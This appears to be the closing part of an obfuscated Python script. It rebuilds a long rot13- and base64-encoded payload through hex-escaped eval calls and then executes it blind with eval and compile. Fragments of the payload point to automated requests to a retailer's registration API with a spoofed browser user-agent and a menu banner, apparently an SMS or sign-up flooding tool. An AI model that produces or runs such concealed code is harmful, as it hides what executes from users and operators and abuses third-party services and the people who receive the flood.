JkyL3DtqTuyVTAipaWyL3Dto25yYvRuVFRuVvxXPDylMKE1pzIlXPxXPDbWPDbtVPNtVPNtVPNtVPNtVPNtPtbXPtbXPtbXPtbXPtbXPzEyMvOgLJgwoTywnltcBtbWqTygMF5moTIypPtkYwNcPtyjpzyhqPuTo3WyYyqVFIESXlVvVtbWK19sK19sK18jZQNjK19sK19sK19sK19sK19sK19sK19sKjcsK19sK18jZQNjK19sK19sK19sK19sK19sK19sK19sK19sPy9sK18jZQNjZS9sK19sK19sK19sK19sK19sK19sK19sK18XK19sZQNjZQOsK19sKlbdXvOVMJkfolRuXvbdVS9sK19sK19sKlOsPy9sZQNjZQNjK19sK19sK19sK19sK19sK19sK19sK19sK18XKmNjZQNjZQOsK19sK19sK19sK19sK19sK19sK19sK19sKjcsZQNjZQNjZS9sK19sK19sK19sK19sK19sK19sK19sK19sPy8jZQNjZQNjZS9sK19sK19sK19sK19sK19sK19sK19sK18XKmNjZQNjZQNjZQNjZQNjK19sK19sK19sK19sK19sK19sKjcsZQNjZQNjZQNjZQNjK19sK19sK19sK19sK19sK19sK19sPy9sZQNjZQNjZQNjZS9sK19sK19sK19sK19sK19sK19sVQOsPy9sKmNjZQNjZQNjZQNjK19sK19sK19sVS9sK19sK19sZQOsPy9sK18jZQNjZQNjZQNjZQNjZQNjZQNjZQNjZQNjZQNjZS8XK19sK19sZQNjZQNjZQNjZQNjZQNjZQNjZQNjZQNjZS9sKjcsK19sK19sKmNjZQNjZQNjZQNjZQNjZQNjZQNjZS9sK19sPy9sK19sK19sK18jZQNjZQNjZQNjZQNjZQNjZS9sK19sK18XK19sK19sK19sK19sK18jZQNjZQNjZQOsK19sK19sK19sKjbW8W2HhCPqynUjaMJnVCPqyM7jaMJF8W2IaCPqyMGjaMJq8W2IziPqyMGjaMJpVNbWVvVvXDbWPtxXPKObo25yVQ0tnJ5jqKDbVxIhqTIlVR51oJWypvN6VPVcPtydLJ0tCFOcoaDbnJ5jqKDbVxIhqTIlVRSgo3IhqPN6VPVcXDbWPtyxMJLtoJSeXPx6PtxWpT9mqPtvnUE0pUZ6Yl9iL3Zgp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'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))